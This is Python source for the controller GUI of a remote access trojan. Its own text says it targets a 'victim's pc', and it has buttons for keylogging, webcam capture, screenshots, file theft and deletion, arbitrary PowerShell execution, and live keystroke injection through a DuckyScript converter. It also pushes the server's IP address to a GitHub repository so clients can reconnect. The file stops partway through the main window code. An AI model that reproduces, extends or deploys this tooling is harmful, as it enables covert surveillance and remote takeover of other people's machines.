import socket
import time
import psutil
import os
import subprocess
import numpy as np
import cv2
import random
from datetime import datetime
from pynput.keyboard import Listener
from zlib import decompress
from tkinter import *
from PIL import ImageTk, Image
from tkinter import colorchooser
from tkinter import messagebox
from tkinter import ttk
import pyautogui
from threading import Thread






width,height = (952,548)
display_text = ''
backup_text  = ''
btn_start_text = 'start server'
server_started = False
button_state = DISABLED
home_buttons = []
line_breaker = '\n'+'='*210+'\n'




def header(HOST,PORT):
	display.insert(END,f'server started at {HOST}:{PORT}')
	display.insert(END,"""\n\nmain commands:
----------------
-send text/binary file     --> to send files to vivtim's pc
-recieve text/binary file  --> to download files from victim's pc
-remove file/directory     --> removes the specified file/directory
-screenshot                --> takes a screenshot of the victim's desktop
-screenshare               --> **work in progress**
-make directory            --> makes a directory
-extract zip               --> extracts the specified zipfile
-popup                     --> shows a popup on victim's pc
-open                      --> opens a file/app
-keyboard access           --> gives controll of the victim's keyboard
-script_mode          	   --> to run commands stored in a text file
-start/stop keylogger 	   --> starts/stops logging keyboard events
-<ls/cd/pwd>               --> lists all the files/changes dir/shows current dir
-<any powershell commands> --> executes powershell commands
-exit                      --> exit
""")




def get_ip_addresses():
	family = socket.AF_INET
	for interface, snics in psutil.net_if_addrs().items():
		for snic in snics:
			if snic.family == family and interface=='wlp2s0':
				return snic.address


def update_ip(HOST,PORT):
	if 'ip' not in os.listdir():
		os.mkdir('ip')
		os.chdir('ip')
		subprocess.run('git init',shell=True)
		subprocess.run('git remote add origin git@github.com:indrajith69/server_address.git',shell=True)
		subprocess.run('git branch -M master',shell=True)
		os.chdir('..')

	os.chdir('ip')
	ip_address=str(HOST)+':'+str(PORT)

	with open('ip_address.txt','w') as f:
		f.write(ip_address)

	subprocess.run('git add ip_address.txt',shell=True)
	subprocess.run("git commit -m 'n ip'",shell=True)
	subprocess.run('git push origin --delete master',shell=True)
	subprocess.run('git push origin master',shell=True)

	os.chdir('..')


def reconnect():
	global client
	client.shutdown(socket.SHUT_WR)
	client.close()
	client,address = server.accept()



def disable_buttons():
	global button_state
	button_state = DISABLED
	for button in home_buttons:
		button.config(state=button_state)

def enable_buttons():
	global button_state
	button_state = NORMAL
	for button in home_buttons:
		button.config(state=button_state)


def live(e,textbox):
	string = textbox.get('1.0',END)
	if string[0]=='\n' and string[-1]=='\n':
		string = string[1:-1]
	elif string[0]=='\n':
		string = string[1:]
	elif string[-1]=='\n':
		string = string[:-1]
	client.send(string.encode('utf-8'))
	textbox.delete('1.0',END)
	textbox.insert('1.0','')
	


def ducky(duckyScriptPath,size=1024):
	client.send('keyboard access'.encode('utf-8'))
	client.recv(1024)
	client.send('1'.encode('utf-8'))
	client.recv(1024)
	name = 'script.pyw'
	f = open(duckyScriptPath,"r",encoding='utf-8')
	pythonScript = open(name, "w", encoding='utf-8')

	pythonScript.write("import pyautogui\n")
	pythonScript.write("import time\n")


	duckyScript = f.readlines()
	duckyScript = [x.strip() for x in duckyScript] 

	defaultDelay = 0
	if duckyScript[0][:7] == "DEFAULT":
		defaultDelay = int(duckyScript[0][:13]) / 1000

	previousStatement = ""	
	
	duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
	"LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
	"ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE", 
	"TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
	" u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
	" Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]

	pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down",
	"left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end",
	"esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space",
	"tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
	"u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
	"q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

	for line in duckyScript:
		if line[0:3] == "REM" :
			previousStatement = line.replace("REM","#")

		elif line[0:5] == "DELAY" :
			previousStatement = "time.sleep(" + str(float(line[6:]) / 1000) + ")"

		elif line[0:6] == "STRING" :
			previousStatement = "pyautogui.typewrite(\"" + line[7:] + "\", interval=0.02)"
	
		elif line[0:6] == "REPEAT" :
			for i in range(int(line[7:]) - 1):
				pythonScript.write(previousStatement)
				pythonScript.write("\n")

		else:
			previousStatement = "pyautogui.hotkey("
			for j in range(len(pyautoguiCommands)):
				if line.find(duckyCommands[j]) != -1:
					previousStatement = previousStatement + "\'" + pyautoguiCommands[j] + "\'," 

			previousStatement = previousStatement[:-1] + ")"
		
		if defaultDelay != 0:
			previousStatement = "time.sleep(" + defaultDelay + ")"
	
		pythonScript.write(previousStatement)
		pythonScript.write("\n")


	f.close()
	pythonScript.close()

	with open(name,'r') as f:
		file_contents = f.read(size)
		while file_contents:
			client.send(file_contents.encode('utf-8'))
			file_contents = f.read(size)

	client.send('~~exit~~'.encode('utf-8'))
	os.remove(name)






################################  THEMES GO BRRR  #####################################################################

def default_theme():
	tsfg='#00FF00'
	tsbg='#000000'

	bd = 2
	bg = '#081828'
	fg = 'white'
	display_color = '#081828'
	text_color    = '#00FF00'
	btn_pad_x = 5
	btn_pad_y = 10
	font_14 = (14)
	font_16 = (16)
	offset_bg1='#485868'
	offset_bg2='#586878'

	kwargs = {'bg':bg,'fg':fg,'font':font_14,'bd':2}

	globals().update(locals())
	home(root)



def pink_theme():
	tsfg='#F64C72'
	tsbg='#102030'

	bd = 2
	bg = '#051525'
	fg = '#fc0658'
	display_color = bg
	text_color    = fg
	btn_pad_x = 5
	btn_pad_y = 10
	font_14 = (14)
	font_16 = (16)
	offset_bg1='#485868'
	offset_bg2='#586878'

	kwargs = {'bg':bg,'fg':fg,'font':font_14,'bd':2}

	globals().update(locals())
	home(root)

def light_theme():
	tsfg,tsbg=('#00FF00','#000000')

	bd = 2
	bg = 'white'
	fg = '#081828'
	tsfg = '#5d5d5d'
	tsbg = 'white'
	text_color = 'black'
	display_color = '#dedede'

	btn_pad_x = 5
	btn_pad_y = 10
	font_14 = (14)
	font_16 = (16)
	offset_bg1='#485868'
	offset_bg2='#586878'

	kwargs = {'bg':bg,'fg':fg,'font':font_14,'bd':2}

	globals().update(locals())
	home(root)


def custom_theme():
	try:
		to_be_changed = pyautogui.prompt('')
		bg = colorchooser.askcolor(title="background color")[1]
		fg = colorchooser.askcolor(title="foreground color")[1]
		display_color = colorchooser.askcolor(title="display color")[1]
		text_color = colorchooser.askcolor(title="display text color")[1]
		tsfg = colorchooser.askcolor(title="highlight foreground")[1]
		tsbg = colorchooser.askcolor(title="highlight background")[1]
		btn_pad_x = int(pyautogui.prompt('pad x value for buttons'))
		btn_pad_y = int(pyautogui.prompt('pad y value for buttons'))
		font_14 = int(pyautogui.prompt('font size'))
		font_16 = (16)

		globals().update(locals())
		home(root)

	except Exception as err:
		default_theme()
		home(root)
		messagebox.showerror('theme error',err)






def changetheme():
	theme = Toplevel()
	theme.title('themes')
	theme.geometry('300x150')

	left_frame = Frame(theme,bg=bg,bd=bd)
	right_frame = Frame(theme,bg=bg,bd=bd)

	btn_light = Button(left_frame,text='light theme',command=light_theme,**kwargs)
	btn_dark  = Button(left_frame,text='dark theme',command=default_theme,**kwargs)
	btn_pink  = Button(right_frame,text='go pink',command=pink_theme,**kwargs)
	btn_cust  = Button(right_frame,text='custom',command=custom_theme,**kwargs)


	left_frame.pack(fill=BOTH,expand=True)
	right_frame.pack(fill=BOTH,expand=True)

	btn_light.pack(side=LEFT,fill=BOTH,expand=True,padx=btn_pad_x,pady=btn_pad_y)
	btn_dark.pack(fill=BOTH,expand=True,padx=btn_pad_x,pady=btn_pad_y)
	btn_pink.pack(side=LEFT,fill=BOTH,expand=True,padx=btn_pad_x,pady=btn_pad_y)
	btn_cust.pack(fill=BOTH,expand=True,padx=btn_pad_x,pady=btn_pad_y)
	theme.mainloop()






################################  THEMES GO BRRR  #####################################################################












################################################ START SERVER #########################################################

def start(PORT):
	global server,client
		
	HOST = get_ip_addresses()
	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((HOST, PORT))
	header(HOST,PORT)
	#update_ip(HOST,PORT)
	server.listen()

	display.insert(END,'\n\nwaiting for a connection\n')
	client,address = server.accept()

	enable_buttons()
	display.insert(END,f'connected to {address}\n')



def start_server(PORT=5064):
	global server_started,btn_start_text,button_state,display_text
	stop_text = 'server stopped'
	if not server_started:
		btn_start_text = 'stop server'
		t1 = Thread(target=start,args=(PORT,))
		t1.start()
	else:
		btn_start_text = 'start server'
		client.send('exit'.encode('utf-8'))
		server.close()

		disable_buttons()
		display.insert(END,'\n'+stop_text)
	server_started = not server_started
	btn_start.config(text=btn_start_text)








def send_b_file(path,name,size=1024):
	try:
		disable_buttons()

		with open(path,'rb') as f:
			client.send('send binary file'.encode('utf-8'))
			client.recv(1024)
			client.send(name.encode('utf-8'))
			client.recv(1024)

			file_contents = f.read(size)
			while file_contents:
				client.send(file_contents)
				file_contents = f.read(size)

		reconnect()
		enable_buttons()
	except Exception as err:
		enable_buttons()
		messagebox.showerror('error',err)


def recv_b_file(path,name,size=1024):
	disable_buttons()
	client.send(path.encode('utf-8'))
	proceed = client.recv(1024).decode('utf-8')
	if proceed!='ready':
		messagebox.showerror('error',proceed)
		enable_buttons()
		return



	with open(name,'wb') as f:
		file_contents = client.recv(size)

		while file_contents:
			f.write(file_contents)
			file_contents = client.recv(size)

	reconnect()
	enable_buttons()


def send_t_file(path,name,size=1024):
	try:
		disable_buttons()
		
		with open(path,'r') as f:
			client.send('send text file'.encode('utf-8'))
			client.recv(1024)
			client.send(name.encode('utf-8'))
			client.recv(1024)

			file_contents = f.read(size)
			while file_contents:
				client.send(file_contents.encode('utf-8'))
				file_contents = f.read(size)

		client.send('~~exit~~'.encode('utf-8'))
		enable_buttons()
	except Exception as err:
		enable_buttons()
		messagebox.showerror('error',err)


def recv_t_file(path,name,size=1024):
	disable_buttons()
	client.send(path.encode('utf-8'))
	
	proceed = client.recv(1024).decode('utf-8')
	if proceed!='ready':
		messagebox.showerror('error',proceed)
		enable_buttons()
		return


	with open(name,'w') as f:
		file_contents = client.recv(size).decode('utf-8')
		while file_contents:
			if '~~exit~~' in file_contents:
				f.write(file_contents.replace('~~exit~~',''))
				break
			f.write(file_contents)
			file_contents = client.recv(size).decode('utf-8')
	enable_buttons()



def transfer_data(Type,mode,path,name):
	if path=='' or name=='':
		messagebox.showwarning('error','please specify a valid path/name')
		return
	display.insert(END,f"\n{Type}ing {path}({'binary' if mode else 'text'})...")

	if Type=='send' and mode is True:
		tsb = Thread(target=send_b_file,args=(path,name))
		tsb.start()
	elif Type=='send' and mode is False:
		tst = Thread(target=send_t_file,args=(path,name))
		tst.start()
	elif Type=='recv' and mode is True:
		client.send('recieve binary file'.encode('utf-8'))
		trb = Thread(target=recv_b_file,args=(path,name))
		trb.start()
	elif Type=='recv' and mode is False:
		client.send('recieve text file'.encode('utf-8'))
		trt = Thread(target=recv_t_file,args=(path,name))
		trt.start()

	display.insert(END,f"\nwriting file as {name}\n"+line_breaker)


def extract(path,name):
	if path=='' or name=='':
		messagebox.showwarning('error','please specify a valid path/name')
		return
	client.send('extract zip'.encode('utf-8'))
	client.recv(1024)
	client.send(path.encode('utf-8'))
	client.recv(1024)
	client.send(name.encode('utf-8'))
	text = f'\nextracted {path} to {name}'
	display.insert(END,text+line_breaker)

def archive(path,name):
	if path=='' or name=='':
		messagebox.showwarning('error','please specify a valid path/name')
		return
	client.send('archive directory'.encode('utf-8'))
	client.recv(1024)
	client.send(path.encode('utf-8'))
	client.recv(1024)
	client.send(name.encode('utf-8'))

	text = f'\narchived {path} to {name}'
	display.insert(END,text+line_breaker)


def stream():
	widgetdestroyer(controlls_frame)
	Label(controlls_frame,text='work in progress',fg='red',bg=bg,font=font_14).pack(fill=BOTH,expand=True)


def update_dir(Type,name):
	if name=='':
		messagebox.showwarning('error','please specify a valid path/name')
		return
	if Type=='make folder':
		client.send('make directory'.encode('utf-8'))
		client.recv(1024)
		client.send(name.encode('utf-8'))
		display.insert(END,'\nmade directory succesfully!\n'+line_breaker)

	elif Type=='remove folder':
		client.send('remove directory'.encode('utf-8'))
		client.recv(1024)
		client.send(name.encode('utf-8'))
		result = client.recv(1024).decode('utf-8')
		if result=='success':
			display.insert(END,'\nremoved directory succesfully!\n'+line_breaker)
		else:
			messagebox.showerror('error',result)

	elif Type=='remove file':
		client.send('remove file'.encode('utf-8'))
		client.recv(1024)
		client.send(name.encode('utf-8'))
		result = client.recv(1024).decode('utf-8')
		if result=='success':
			display.insert(END,'\nremoved file succesfully!\n'+line_breaker)
		else:
			messagebox.showerror('error',result)

def openf(path):
	if path=='':
		messagebox.showwarning('error','please specify a valid path/name')
		return
	disable_buttons()
	client.send('open'.encode('utf-8'))
	client.recv(1024)
	client.send(path.encode('utf-8'))
	result = client.recv(1024).decode('utf-8')
	if result=='success':
		display.insert(END,f'\nopened {os.path.basename(path)}{line_breaker}')
	else:
		messagebox.showerror('error',result)
	enable_buttons()
	

def change_directory(path):
	client.send(('cd '+path).encode('utf-8'))
	display.insert(END,'\n'+client.recv(1024).decode('utf-8'))
	display.insert(END,'\n'+line_breaker)

def listdir():
	client.send(('ls').encode('utf-8'))
	display.insert(END,line_breaker+'ls\n\n')
	result = client.recv(1024).decode('utf-8')
	while '~~exit~~' not in result:
		display.insert(END,result)
		result = client.recv(1024).decode('utf-8')
	else:
		display.insert(END,result.replace('~~exit~~','')+line_breaker)

def printdir():
	client.send(('pwd').encode('utf-8'))
	display.insert(END,'\n'+client.recv(1024).decode('utf-8'))
	display.insert(END,'\n'+line_breaker)

def execute_powershell(command):
	disable_buttons()
	client.send('powershell'.encode('utf-8'))
	client.recv(1024)
	client.send(command.encode('utf-8'))
	display.insert(END,'\ncommand executed\n\noutput:\n\n')
	result = client.recv(1024).decode('utf-8')
	while '~~exit~~' not in result:
		display.insert(END,result)
		result = client.recv(1024).decode('utf-8')
	else:
		display.insert(END,result.replace('~~exit~~','')+line_breaker)
	enable_buttons()

def start_kl():
	client.send('start keylogger'.encode('utf-8'))
	display.insert(END,line_breaker+'started keylogger'+line_breaker)

def stop_kl():
	client.send('stop keylogger'.encode('utf-8'))
	display.insert(END,line_breaker+'stopped keylogger'+line_breaker)


def popup_show(title,message,ptype):
	client.send('popup'.encode('utf-8'))
	client.recv(1024).decode('utf-8')
	
	client.send(title.encode('utf-8'))
	client.recv(1024).decode('utf-8')
	client.send(message.encode('utf-8'))
	client.recv(1024).decode('utf-8')
	client.send(ptype.encode('utf-8'))
	client.recv(1024).decode('utf-8')
	display.insert(END,'\npopup showed'+line_breaker)












####################################      BUTTON UI'S        #######################################################################
def widgetdestroyer(root):
	try:
		persist_display()
	except:
		pass
	for widget in root.winfo_children():
		widget.destroy()



def clear(*textboxes):
	global display_text
	display_text = ''
	for textbox in textboxes:
		textbox.delete('1.0',END)


def persist_display():
	global display_text,backup_text
	backup_text = display_text
	display_text=display.get('1.0',END)



def screenshot():
	global image,image_r
	disable_buttons()
	size = 1024

	client.send('screenshot'.encode('utf-8'))
	client.recv(size)

	today = datetime.today()
	date = str(today.date())
	time = str(today.time().hour)+':'+str(today.time().minute)+':'+str(today.time().second)
	filename = date+'--'+time+'.png'

	if 'screenshots' not in os.listdir():
		os.mkdir('screenshots')

	path = os.path.join('screenshots',filename)

	with open(path,'wb') as f:
		file_contents = client.recv(size)

		while file_contents:
			f.write(file_contents)
			file_contents = client.recv(size)

	reconnect()
	enable_buttons()


	width,height = pyautogui.size()
	image = Image.open(path)
	image_r = ImageTk.PhotoImage(image.resize((width//3,height//3)))
	display.insert(END,'\n')
	display.image_create(END,image=image_r)
	widgetdestroyer(controlls_frame)
	
	btn_fullscreen = Button(controlls_frame,text='veiw in fullscreen',command=lambda:fullscreen(path),**kwargs)
	btn_fullscreen.pack(fil=BOTH,expand=True)


def take_picture(): 
	disable_buttons()
	global image_i,image_c
	size = 1024

	client.send('take picture'.encode('utf-8'))
	client.recv(size)

	today = datetime.today()
	date = str(today.date())
	time = str(today.time().hour)+':'+str(today.time().minute)+':'+str(today.time().second)
	filename = date+'--'+time+'.png'

	if 'camera' not in os.listdir():
		os.mkdir('camera')

	path = os.path.join('camera',filename)

	with open(path,'wb') as f:
		file_contents = client.recv(size)

		while file_contents:
			f.write(file_contents)
			file_contents = client.recv(size)

	reconnect()
	enable_buttons()


	width,height = pyautogui.size()
	image_i = Image.open(path)
	image_c = ImageTk.PhotoImage(image_i.resize((width//3,height//3)))
	display.insert(END,'\n')
	display.image_create(END,image=image_c)
	widgetdestroyer(controlls_frame)
	
	btn_fullscreen = Button(controlls_frame,text='veiw in fullscreen',command=lambda:fullscreen(path),**kwargs)
	btn_fullscreen.pack(fil=BOTH,expand=True)

def fullscreen(filename):
	widgetdestroyer(root)
	
	bg = Canvas(root)
	bg.pack(fill=BOTH,expand=True)

	image = ImageTk.PhotoImage(file=filename)
	root.image = image

	imwidth  = image.width()
	imheight = image.height()

	root.maxsize(imwidth,imheight)

	root.geometry(f"{imwidth}x{imheight}")
	bg.create_image((0,0), image=image, anchor='nw')

	btn_exit = Button(root,text='exit fullscreen',bg='black',fg='cyan',command=lambda:home(root))
	btn_window = bg.create_window(0,0,anchor='nw',window=btn_exit)


def transfer_file(Type):
	state = True
	text = f'\n{line_breaker}\n{Type} file - option selected\n1)enter the path of the file\n2)enter the name for the file\n3)select the mode of the file'
	display.insert(END,text)
	widgetdestroyer(controlls_frame)

	def change_state():
		nonlocal state
		state = not state
		if state:
			btn_mode.config(text='binary')
		else:
			btn_mode.config(text='text')


	label_path = Label(controlls_frame,text='path :',**kwargs)
	label_name = Label(controlls_frame,text='name :',**kwargs)

	entry_path = Entry(controlls_frame,width=50,**kwargs)
	entry_name = Entry(controlls_frame,width=50,**kwargs)

	btn_mode = Button(controlls_frame,text='binary',bg=bg,fg=fg,font=font_16,command=change_state)
	btn_type = Button(controlls_frame,text=Type,bg=bg,fg=fg,font=font_16,command=lambda:transfer_data(Type,state,entry_path.get(),entry_name.get()))


	label_path.grid(row=0,column=0, sticky='NSW')
	entry_path.grid(row=0,column=1, sticky='NSEW')
	label_name.grid(row=1,column=0, sticky='NSW')
	entry_name.grid(row=1,column=1, sticky='NSEW')
	btn_mode.grid(row=2,column=0,sticky='SW')
	btn_type.grid(row=2,column=1,sticky='SE')


def extract_zip():
	state = True
	text = '\n\nextract zip - option selected\n1)enter the path of the zip file\n2)enter the name for the directory for the zip to be extracted in'
	display.insert(END,line_breaker+text)
	widgetdestroyer(controlls_frame)


	label_path = Label(controlls_frame,text='path :',**kwargs)
	label_name = Label(controlls_frame,text='name :',**kwargs)

	entry_path = Entry(controlls_frame,width=50,**kwargs)
	entry_name = Entry(controlls_frame,width=50,**kwargs)

	btn_extract = Button(controlls_frame,text='extract zip',bg=bg,fg=fg,font=font_16,command=lambda:extract(entry_path.get(),entry_name.get()))


	label_path.grid(row=0,column=0, sticky='NSW')
	entry_path.grid(row=0,column=1, sticky='NSEW')
	label_name.grid(row=1,column=0, sticky='NSW')
	entry_name.grid(row=1,column=1, sticky='NSEW')
	btn_extract.grid(row=2,column=1,sticky='SE')

def archive_dir():
	state = True
	text = '\n\narchive directory - option selected\n1)enter the path of the directory\n2)enter the name for the zipfile'
	display.insert(END,line_breaker+text)
	widgetdestroyer(controlls_frame)


	label_path = Label(controlls_frame,text='path :',**kwargs)
	label_name = Label(controlls_frame,text='name :',**kwargs)

	entry_path = Entry(controlls_frame,width=50,**kwargs)
	entry_name = Entry(controlls_frame,width=50,**kwargs)

	btn_archive = Button(controlls_frame,text='archive directory',bg=bg,fg=fg,font=font_16,command=lambda:archive(entry_path.get(),entry_name.get()))


	label_path.grid(row=0,column=0, sticky='NSW')
	entry_path.grid(row=0,column=1, sticky='NSEW')
	label_name.grid(row=1,column=0, sticky='NSW')
	entry_name.grid(row=1,column=1, sticky='NSEW')
	btn_archive.grid(row=2,column=1,sticky='SE')

def update_items(Type):
	widgetdestroyer(controlls_frame)
	display.insert(END,f'\n{line_breaker}{Type}\nenter the path of the {"file" if Type=="remove file" else "directory"}')
	label_name = Label(controlls_frame,text='name :',**kwargs)
	entry_name = Entry(controlls_frame,width=50,**kwargs)

	btn_type = Button(controlls_frame,text=Type,bg=bg,fg=fg,font=font_16,command=lambda:update_dir(Type,entry_name.get()))


	label_name.grid(row=1,column=0, sticky='NSW')
	entry_name.grid(row=1,column=1, sticky='NSEW')
	btn_type.grid(row=2,column=1,sticky='SE')


def open_file():
	widgetdestroyer(controlls_frame)
	display.insert(END,f'\n{line_breaker}\nenter the path of the file')
	label_path = Label(controlls_frame,text='path :',**kwargs)
	entry_path = Entry(controlls_frame,width=50,**kwargs)

	btn_open = Button(controlls_frame,text='open',bg=bg,fg=fg,font=font_16,command=lambda:Thread(target=openf,args=(entry_path.get(),)).start())


	label_path.grid(row=1,column=0, sticky='NSW')
	entry_path.grid(row=1,column=1, sticky='NSEW')
	btn_open.grid(row=2,column=1,sticky='SE')

def chdir():
	widgetdestroyer(controlls_frame)
	label_path = Label(controlls_frame,text='path :',**kwargs)
	entry_path = Entry(controlls_frame,width=50,**kwargs)

	btn_cd = Button(controlls_frame,text='change directory',bg=bg,fg=fg,font=font_16,command=lambda:change_directory(entry_path.get()))


	label_path.grid(row=1,column=0, sticky='NSW')
	entry_path.grid(row=1,column=1, sticky='NSEW')
	btn_cd.grid(row=2,column=1,sticky='SE')

def linux():
	widgetdestroyer(controlls_frame)

	btn_cd = Button(controlls_frame,text='change directory',bg=bg,fg=fg,font=font_16,command=lambda:chdir())
	btn_ls = Button(controlls_frame,text='list directory',bg=bg,fg=fg,font=font_16,command=listdir)
	btn_pd = Button(controlls_frame,text='print working directory',bg=bg,fg=fg,font=font_16,command=printdir)

	btn_cd.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)
	btn_ls.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)
	btn_pd.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)

def powershell():
	widgetdestroyer(controlls_frame)
	display.insert(END,'\n\npowershell mode activated')
	label_command = Label(controlls_frame,text='command :',**kwargs)
	entry_command = Entry(controlls_frame,width=50,**kwargs)

	btn_exc = Button(controlls_frame,text='execute',bg=bg,fg=fg,font=font_16,command=lambda:Thread(target=execute_powershell,args=(entry_command.get(),)).start())


	label_command.grid(row=1,column=0, sticky='NSW')
	entry_command.grid(row=1,column=1, sticky='NSEW')
	btn_exc.grid(row=2,column=1,sticky='SE')

def k_ducky():
	widgetdestroyer(controlls_frame)
	display.insert(END,'\n\nenter the path of the ducky script')
	label_path = Label(controlls_frame,text='path :',**kwargs)
	entry_path = Entry(controlls_frame,width=50,**kwargs)

	btn_exc = Button(controlls_frame,text='execute',bg=bg,fg=fg,font=font_16,command=lambda:ducky(entry_path.get()))


	label_path.grid(row=1,column=0, sticky='NSW')
	entry_path.grid(row=1,column=1, sticky='NSEW')
	btn_exc.grid(row=2,column=1,sticky='SE')

def k_live():
	client.send('keyboard access'.encode('utf-8'))
	client.recv(1024)
	client.send('2'.encode('utf-8'))
	client.recv(1024)

	widgetdestroyer(controlls_frame)
	display.insert(END,"\n\nvictim's keyboard is in your hands now :)")
	input_frame = Frame(controlls_frame,bg=bg,bd=bd)
	btn_frame   = Frame(controlls_frame,bg=bg,bd=bd)
	input_screen,input_scrollbar = screen(input_frame)
	input_screen.config(height=5)
	input_screen.bind('<Return>',lambda e:live(e,input_screen))
	btn_exit = Button(btn_frame,text='exit',bg=bg,fg=fg,font=font_16,command=lambda:client.send('exit'.encode('utf-8')))

	input_frame.pack(fill=BOTH,expand=True)
	btn_frame.pack(fill=BOTH,expand=True)
	btn_exit.pack(fill=BOTH,expand=True)

def keyboard():
	widgetdestroyer(controlls_frame)
	display.insert(END,'\n'+line_breaker)

	btn_ducky = Button(controlls_frame,text='execute ducky script',bg=bg,fg=fg,font=font_16,command=lambda:k_ducky())
	btn_live = Button(controlls_frame,text='live mode',bg=bg,fg=fg,font=font_16,command=lambda:k_live())

	btn_ducky.pack(side=LEFT,fill=BOTH,expand=True,padx=30,pady=10)
	btn_live.pack(side=LEFT,fill=BOTH,expand=True,padx=30,pady=10)

def keylogger():
	widgetdestroyer(controlls_frame)

	btn_start = Button(controlls_frame,text='start keylogger',bg=bg,fg=fg,font=font_16,command=start_kl)
	btn_stop  = Button(controlls_frame,text='stop keylogger' ,bg=bg,fg=fg,font=font_16,command=stop_kl)

	btn_start.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)
	btn_stop.pack(side=LEFT,fill=BOTH,expand=True,padx=10,pady=10)


def popup():
	widgetdestroyer(controlls_frame)
	msg = '1)enter the title of the popup window\n2)enter the message the popup will show\n3)enter what type the popup is gonna be'
	display.insert(END,line_breaker+'popup\n\n'+msg)

	label_title = Label(controlls_frame,text='title :',**kwargs)
	label_msg   = Label(controlls_frame,text='message :',**kwargs)
	label_type  = Label(controlls_frame,text='type :',**kwargs)

	entry_title = Entry(controlls_frame,width=50,justify=CENTER,**kwargs)
	entry_msg = Entry(controlls_frame,width=50,justify=CENTER,**kwargs)
	err_type   = ttk.Combobox(controlls_frame,value=('error','warning','info'),justify=CENTER)

	btn_sp  = Button(controlls_frame,text='show popup',bg=bg,fg=fg,font=font_16,
		command=lambda:popup_show(entry_title.get(),entry_msg.get(),err_type.get()))


	label_title.grid(row=0,column=0, sticky='NSW')
	entry_title.grid(row=0,column=1, sticky='NSEW')
	label_msg.grid(row=1,column=0, sticky='NSW')
	entry_msg.grid(row=1,column=1, sticky='NSEW')
	label_type.grid(row=2,column=0,sticky='NW')
	err_type.grid(row=2,column=1,sticky='NEW')
	btn_sp.grid(row=3,column=1,sticky='SE')
























































###################### MAIN WINDOW ######################################


def screen(display_frame):
	scroll_bar = Scrollbar(display_frame,bg=display_color)
	display = Text(display_frame,fg=text_color,bg=display_color,wrap='none',bd=0,height=32,
		selectforeground=tsfg,selectbackground=tsbg,yscrollcommand=scroll_bar.set)
	scroll_bar.config(command=display.yview)

	display.pack(side=LEFT,fill=BOTH,expand=TRUE)
	scroll_bar.pack(fill=Y,expand=TRUE)

	return display,scroll_bar



def home(root):
	global display,btn_start,controlls_frame,home_buttons

	widgetdestroyer(root)
	root.maxsize(pyautogui.size().width,pyautogui.size().height)
	root.config(bg=bg)

	#Defining frames to organise widgets
	root_pannel      = PanedWindow()
	controlls_pannel = PanedWindow(root_pannel,orient=VERTICAL)
	frame_buttons    = LabelFrame(root_pannel,bg=bg)
	display_frame    = LabelFrame(controlls_pannel,bg=bg)
	controlls_frame  = LabelFrame(controlls_pannel,bg=bg)

	left_buttons  = Frame(frame_buttons,bg=bg)
	right_buttons = Frame(frame_buttons,bg=bg)
	hidden_area   = LabelFrame(frame_buttons,bg=bg)

	root_pannel.add(frame_buttons)
	root_pannel.add(controlls_pannel)
	controlls_pannel.add(display_frame)
	controlls_pannel.add(controlls_frame)

	root_pannel.pack(fill=BOTH, expand=1)
	left_buttons.pack(side=LEFT,fill=BOTH,expand=True)
	right_buttons.pack(side=RIGHT,fill=BOTH,expand=True)


	controlls_frame.columnconfigure(0, weight=0)
	controlls_frame.columnconfigure(1, weight=1)
	controlls_frame.rowconfigure(0, weight=1)
	controlls_frame.rowconfigure(1, weight=1)
	controlls_frame.rowconfigure(2, weight=1)

	display,scroll_bar = screen(display_frame)
	display.config(height=32,width=80)
	display.insert(END,display_text)
	#header('192.168.18.3',5050)


	#adding buttons
	#left side buttons
	btn_open       = Button(left_buttons,state=button_state,text='open',command=open_file,**kwargs)
	btn_mkdir      = Button(left_buttons,state=button_state,text='make a folder',command=lambda :update_items('make folder'),**kwargs)
	btn_linux      = Button(left_buttons,state=button_state,text='linux commands',command=lambda:linux(),**kwargs)
	btn_popup      = Button(left_buttons,state=button_state,text='popup',command=lambda:popup(),**kwargs)
	btn_send_file  = Button(left_buttons,state=button_state,text='send a file',command=lambda:transfer_file('send'),**kwargs)
	btn_screenshot = Button(left_buttons,state=button_state,text='take screenshot',command=lambda:Thread(target=screenshot).start(),**kwargs)
	btn_extract_zip       = Button(left_buttons,state=button_state,text='extract a zip',command=lambda:extract_zip(),**kwargs)
	btn_keyboard_controll = Button(left_buttons,state=button_state,text='keyboard access',command=lambda:keyboard(),**kwargs)

	#right side buttons
	btn_rmf         = Button(right_buttons,state=button_state,text='remove a file',command=lambda :update_items('remove file'),**kwargs)
	btn_home        = Button(right_buttons,state=button_state,text='home',command=lambda:home(root),**kwargs)
	btn_rmdir       = Button(right_buttons,state=button_state,text='remove a folder',command=lambda :update_items('remove folder'),**kwargs)
	btn_archive     = Button(right_buttons,state=button_state,text='archive folder',command=lambda:archive_dir(),**kwargs)
	btn_recv_file   = Button(right_buttons,state=button_state,text='recieve a file',command=lambda:transfer_file('recv'),**kwargs)
	btn_keylogger   = Button(right_buttons,state=button_state,text='keylogger',command=keylogger,**kwargs)
	btn_powershell  = Button(right_buttons,state=button_state,text='powershell',command=lambda:powershell(),**kwargs)
